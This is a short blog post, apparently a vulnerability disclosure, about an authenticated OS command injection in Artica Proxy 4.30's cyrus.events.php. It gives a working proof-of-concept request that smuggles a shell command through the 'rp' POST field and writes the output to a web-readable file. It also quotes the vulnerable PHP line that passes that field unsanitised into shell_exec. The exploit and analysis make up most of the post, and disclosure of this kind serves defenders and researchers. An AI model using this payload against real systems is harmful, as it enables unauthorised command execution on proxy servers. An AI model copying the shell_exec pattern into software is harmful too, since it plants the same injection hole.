=== Content from medium.com_8ac2e950_20250114_221809.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F3aa2a868c695&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40rootless724%2Fartica-proxy-4-30-cyrus-events-php-rce-3aa2a868c695&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40rootless724%2Fartica-proxy-4-30-cyrus-events-php-rce-3aa2a868c695&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Artica Proxy 4.30 cyrus.events.php RCE

[![rootless](https://miro.medium.com/v2/resize:fill:88:88/1*wcE74hiigoKs44JXneaCpQ.jpeg)](/%40rootless724?source=post_page---byline--3aa2a868c695--------------------------------)

[rootless](/%40rootless724?source=post_page---byline--3aa2a868c695--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffe689e022823&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40rootless724%2Fartica-proxy-4-30-cyrus-events-php-rce-3aa2a868c695&user=rootless&userId=fe689e022823&source=post_page-fe689e022823--byline--3aa2a868c695---------------------post_header-----------)

Sep 26, 2021

--

Listen

Share

# Vendor && Product

[www.articatech.com](http://www.articatech.com/)

Artica Web Proxy v4.30.000000

Download: <http://www.articatech.com/download.php>

# Reproduction

Login the web account, use this poc

> *Because the execution result is not echoed, we view the result by writing a file*

```
<https://192.168.108.14:9000/cyrus.events.php?logs=>
 ​
 POST:
 rp=;id>../1.txt;
```
![]()

access <https://192.168.108.14:9000/1.txt>, we can see the execution result.

![]()
# OS Command Injection Analysis

The vulnerable file is in ： `cyrus.events.php`, it receives a parameter `logs` and execute function `logs()`

![]()

In the function `logs()`, it receives another parameter `rp` with POST method, then take them to the file `cyrus.php` with `?cyrus-events=yes`

![]()

In `cyrus.php`, `cyrus-events` corresponds to `cyrus_events()` which can execute os command through `;`

![]()![]()
```
$cmdline="$grep --binary-files=text -Ei \"$search\" /var/log/mail.log|$tail -n $rp  >$logfile 2>&1";
...
shell_exec($cmdline);
```
[Vulnerability](/tag/vulnerability?source=post_page-----3aa2a868c695--------------------------------)

--

--

[![rootless](https://miro.medium.com/v2/resize:fill:96:96/1*wcE74hiigoKs44JXneaCpQ.jpeg)](/%40rootless724?source=post_page---post_author_info--3aa2a868c695--------------------------------)[![rootless](https://miro.medium.com/v2/resize:fill:128:128/1*wcE74hiigoKs44JXneaCpQ.jpeg)](/%40rootless724?source=post_page---post_author_info--3aa2a868c695--------------------------------)Follow[## Written by rootless](/%40rootless724?source=post_page---post_author_info--3aa2a868c695--------------------------------)[1 Follower](/%40rootless724/followers?source=post_page---post_author_info--3aa2a868c695--------------------------------)·[1 Following](/%40rootless724/following?source=post_page---post_author_info--3aa2a868c695--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----3aa2a868c695--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----3aa2a868c695--------------------------------)[About](/about?autoplay=1&source=post_page-----3aa2a868c695--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----3aa2a868c695--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----3aa2a868c695--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----3aa2a868c695--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----3aa2a868c695--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----3aa2a868c695--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----3aa2a868c695--------------------------------)[Teams](/business?source=post_page-----3aa2a868c695--------------------------------)


